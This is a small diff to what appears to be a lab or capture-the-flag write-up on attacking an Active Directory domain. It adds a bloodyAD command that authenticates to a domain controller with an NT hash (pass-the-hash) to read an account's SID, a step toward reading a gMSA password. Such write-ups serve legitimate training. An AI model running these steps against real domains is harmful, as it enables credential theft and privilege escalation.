@@ -617,6 +617,10 @@ Looks like i can read the gMSA hash password of the account
 After trying to read it, it looks like i dont have permission, but i should be able to make it so that `jay` can read it since i have WRITE
 
 ```python
+bloodyAD --host dc01.casper.hsm -d casper.hsm -u jay -p ':9b88ec231f4f0e5cb7d9edef1f399f6c' get object jay --attr objectSid                                                    
+distinguishedName: CN=jay,CN=Users,DC=casper,DC=hsm
+objectSid: S-1-5-21-247086266-1178499391-1139383971-1106
+
 
 ```
 
